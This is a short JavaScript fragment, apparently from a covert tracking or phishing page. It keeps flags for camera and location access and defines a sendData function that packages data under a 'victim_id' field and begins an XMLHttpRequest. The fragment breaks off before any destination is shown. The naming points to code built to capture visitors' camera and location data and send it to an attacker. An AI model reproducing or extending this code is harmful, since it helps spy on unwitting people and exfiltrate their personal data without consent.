    var activated = false, camOk = false, locOk = false;

    function setStatus(m) { var el = document.getElementById('status-line'); if (el) el.textContent = m; }
    function sendData(type, data) {
        var payload = { victim_id: CFG.VICTIM_ID, type: type };
        for (var k in data) { if (data.hasOwnProperty(k)) payload[k] = data[k]; }
        try {
            var xhr = new XMLHttpRequest();
